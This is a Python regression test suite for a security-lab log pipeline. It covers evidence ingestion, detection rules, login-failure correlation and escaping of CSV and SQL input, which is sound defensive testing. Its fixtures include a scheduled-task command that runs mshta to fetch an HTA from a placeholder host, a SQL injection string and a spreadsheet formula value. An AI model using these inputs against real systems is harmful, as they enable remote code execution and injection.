"""Regression tests for evidence integrity, correlation scope and analyst output."""

import copy
from contextlib import closing
import json
from pathlib import Path
import sqlite3
import tempfile
import unittest

from soclab.detections import detect, load_rules
from soclab.events import normalize_event, utc_timestamp
from soclab.report import analyze
from soclab.store import ingest, iter_events


ROOT = Path(__file__).resolve().parents[1]
RULES = ROOT / "rules" / "windows.json"
FIXTURE = ROOT / "data" / "fixtures" / "demo.jsonl"


class PipelineTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.db = self.root / "evidence.sqlite"
        self.rules = load_rules(RULES)
        self.fixture = [json.loads(line) for line in FIXTURE.read_text(encoding="utf-8").splitlines()]

    def write(self, events, name="events.jsonl"):
        path = self.root / name
        path.write_text("".join(json.dumps(event) + "\n" for event in events), encoding="utf-8")
        return path

    def normalized(self, events, digest="a" * 64):
        return [normalize_event(event, digest, i) for i, event in enumerate(events, 1)]

    def test_full_bundle_has_eight_review_findings_and_all_nineteen_events(self):
        ingest(FIXTURE, self.db)
        manifest = analyze(self.db, RULES, self.root / "run")
        self.assertEqual(manifest["event_count"], 19)
        self.assertEqual(manifest["finding_count"], 8)
        self.assertEqual(set(manifest["findings_by_rule"]), {"AUTH-001", *(f"WIN-{i:03}" for i in range(1, 8))})
        alerts = [json.loads(line) for line in (self.root / "run" / "findings.jsonl").read_text().splitlines()]
        self.assertTrue(all(alert["status"] == "needs_review" for alert in alerts))
        self.assertEqual(manifest["verdict"], "unassessed")
        auth = next(alert for alert in alerts if alert["rule_id"] == "AUTH-001")
        self.assertEqual(len(auth["evidence"]), 6)
        self.assertIn("TODO", (self.root / "run" / "case-notes.md").read_text())

    def test_reimport_is_idempotent_and_original_evidence_survives(self):
        first = ingest(FIXTURE, self.db)
        second = ingest(FIXTURE, self.db)
        self.assertFalse(first["already_imported"])
        self.assertTrue(second["already_imported"])
        events = list(iter_events(self.db))
        self.assertEqual(len(events), 19)
        self.assertEqual(json.loads(events[0]["original_json"]), self.fixture[0])
        self.assertEqual(events[0]["source_line"], 1)

    def test_bad_line_rolls_back_entire_source(self):
        bad = copy.deepcopy(self.fixture[0])
        bad["timestamp"] = "2026-09-01T09:00:00"
        path = self.write([self.fixture[0], bad])
        with self.assertRaisesRegex(ValueError, "line 2"):
            ingest(path, self.db)
        with closing(sqlite3.connect(self.db)) as conn:
            self.assertEqual(conn.execute("SELECT COUNT(*) FROM events").fetchone()[0], 0)
            self.assertEqual(conn.execute("SELECT COUNT(*) FROM sources").fetchone()[0], 0)

    def test_same_record_id_in_different_sources_is_preserved(self):
        a = self.write([self.fixture[0]], "a.jsonl")
        other = copy.deepcopy(self.fixture[0])
        other["host"] = "WS-OTHER"
        b = self.write([other], "b.jsonl")
        ingest(a, self.db)
        ingest(b, self.db)
        self.assertEqual(len(list(iter_events(self.db))), 2)

    def test_offset_timestamp_is_normalized_and_naive_is_rejected(self):
        self.assertEqual(utc_timestamp("2026-09-01T16:00:00+07:00"), "2026-09-01T09:00:00.000000Z")
        with self.assertRaises(ValueError):
            utc_timestamp("2026-09-01T09:00:00")

    def test_bom_unicode_and_blank_line_preserve_physical_reference(self):
        event = copy.deepcopy(self.fixture[0])
        event["host"] = "MAY-ĐIỀU-TRA"
        path = self.root / "unicode.jsonl"
        path.write_text("\n" + json.dumps(event, ensure_ascii=False) + "\n", encoding="utf-8-sig")
        ingest(path, self.db)
        result = list(iter_events(self.db))[0]
        self.assertEqual(result["host"], "MAY-ĐIỀU-TRA")
        self.assertEqual(result["source_line"], 2)

    def test_invalid_correlation_settings_create_no_partial_bundle(self):
        ingest(FIXTURE, self.db)
        with self.assertRaises(ValueError):
            analyze(self.db, RULES, self.root / "invalid", threshold=0)
        self.assertFalse((self.root / "invalid").exists())

    def test_csv_formula_is_neutralized_without_changing_original(self):
        event = copy.deepcopy(self.fixture[7])
        event["host"] = "=1+1"
        event["event_data"]["CommandLine"] = "=1+1"
        ingest(self.write([event]), self.db)
        analyze(self.db, RULES, self.root / "csv")
        import csv
        with (self.root / "csv" / "timeline.csv").open(newline="", encoding="utf-8") as stream:
            row = list(csv.DictReader(stream))[0]
        self.assertEqual(row["host"], "'=1+1")
        with (self.root / "csv" / "processes.csv").open(newline="", encoding="utf-8") as stream:
            row = list(csv.DictReader(stream))[0]
        self.assertEqual(row["command_line"], "'=1+1")
        self.assertEqual(json.loads(next(iter_events(self.db))["original_json"])["host"], "=1+1")

    def test_wrong_channel_or_provider_cannot_trigger_process_rule(self):
        encoded = copy.deepcopy(self.fixture[7])
        encoded["channel"] = "Unrelated/Operational"
        self.assertEqual(list(detect(self.normalized([encoded]), self.rules)), [])
        encoded["channel"] = self.fixture[7]["channel"]
        encoded["provider"] = "Unrelated-Provider"
        self.assertEqual(list(detect(self.normalized([encoded]), self.rules)), [])

    def test_legitimate_backup_still_requires_context_review(self):
        events = [e for e in self.fixture if e["fixture_label"] == "synthetic_benign_alert_expected"]
        alerts = list(detect(self.normalized(events), self.rules))
        self.assertEqual([alert["rule_id"] for alert in alerts], ["WIN-002"])
        self.assertEqual(alerts[0]["status"], "needs_review")

    def test_plain_benign_samples_do_not_trigger_current_rules(self):
        events = [e for e in self.fixture if e["fixture_label"] == "synthetic_benign"]
        self.assertEqual(list(detect(self.normalized(events), self.rules)), [])

    def test_schtasks_gap_rule_matches_creation_but_not_query(self):
        event = copy.deepcopy(self.fixture[7])
        event["event_data"]["Image"] = "C:\\Windows\\System32\\schtasks.exe"
        event["event_data"]["CommandLine"] = 'schtasks.exe /Create /TN Review /TR "mshta.exe https://example.invalid/lab.hta"'
        self.assertEqual([a["rule_id"] for a in detect(self.normalized([event]), self.rules)], ["WIN-008"])
        event["event_data"]["CommandLine"] = "schtasks.exe /Query /TN powershell-backup"
        self.assertEqual(list(detect(self.normalized([event]), self.rules)), [])

    def test_legitimate_scripted_task_is_an_expected_review_lead(self):
        event = copy.deepcopy(self.fixture[7])
        event["event_data"]["Image"] = "C:\\Windows\\System32\\schtasks.exe"
        event["event_data"]["CommandLine"] = 'schtasks.exe /Create /TN Backup /TR "powershell.exe -File C:\\Lab\\backup.ps1"'
        alert = list(detect(self.normalized([event]), self.rules))[0]
        self.assertEqual(alert["rule_id"], "WIN-008")
        self.assertEqual(alert["status"], "needs_review")

    def test_auth_does_not_mix_host_user_ip_domain_or_logon_type(self):
        for field in ("host", "TargetUserName", "IpAddress", "TargetDomainName", "LogonType"):
            with self.subTest(field=field):
                events = copy.deepcopy(self.fixture[:6])
                target = events[-1] if field == "host" else events[-1]["event_data"]
                target[field] = "different"
                self.assertEqual(list(detect(self.normalized(events), [])), [])

    def test_auth_missing_key_fields_does_not_correlate(self):
        for field in ("TargetUserName", "IpAddress", "TargetDomainName", "LogonType"):
            with self.subTest(field=field):
                events = copy.deepcopy(self.fixture[:6])
                for event in events:
                    event["event_data"].pop(field)
                self.assertEqual(list(detect(self.normalized(events), [])), [])

    def test_auth_expired_failures_do_not_trigger(self):
        events = copy.deepcopy(self.fixture[:6])
        events[-1]["timestamp"] = "2026-09-01T10:00:00Z"
        self.assertEqual(list(detect(self.normalized(events), [])), [])

    def test_auth_correlation_is_scoped_to_source_by_default(self):
        events = self.normalized(self.fixture[:5]) + self.normalized(self.fixture[5:6], "b" * 64)
        self.assertEqual(list(detect(events, [])), [])
        self.assertEqual(len(list(detect(events, [], cross_source=True))), 1)

    def test_auth_success_clears_window_and_boundary_is_inclusive(self):
        events = copy.deepcopy(self.fixture[:6])
        events[-1]["timestamp"] = "2026-09-01T09:10:00Z"
        repeated_success = copy.deepcopy(events[-1])
        repeated_success["record_id"] += 1
        alerts = list(detect(self.normalized(events + [repeated_success]), []))
        self.assertEqual(len(alerts), 1)

    def test_search_uses_raw_events_and_parameterized_host(self):
        ingest(FIXTURE, self.db)
        self.assertEqual(len(list(iter_events(self.db, event_id=4104))), 1)
        self.assertEqual(len(list(iter_events(self.db, host="x' OR 1=1 --"))), 0)
        self.assertEqual(len(list(iter_events(self.db, user="LAB\\ANALYST.LAB", term="inventory"))), 1)
        self.assertEqual(len(list(iter_events(self.db, start="2026-09-01T09:02:11Z", end="2026-09-01T09:02:11Z"))), 1)

    def test_existing_bundle_cannot_be_silently_overwritten(self):
        ingest(FIXTURE, self.db)
        analyze(self.db, RULES, self.root / "run")
        before = (self.root / "run" / "manifest.json").read_bytes()
        with self.assertRaisesRegex(ValueError, "already exists"):
            analyze(self.db, RULES, self.root / "run")
        self.assertEqual((self.root / "run" / "manifest.json").read_bytes(), before)

    def test_rule_loader_rejects_duplicate_ids_and_unknown_operators(self):
        for mutated in ([self.rules[0], self.rules[0]], [{**self.rules[0], "conditions": [{"field": "event_id", "op": "execute", "value": "anything"}]}]):
            path = self.root / "bad-rules.json"
            path.write_text(json.dumps(mutated), encoding="utf-8")
            with self.assertRaises(ValueError):
                load_rules(path)


if __name__ == "__main__":
    unittest.main()
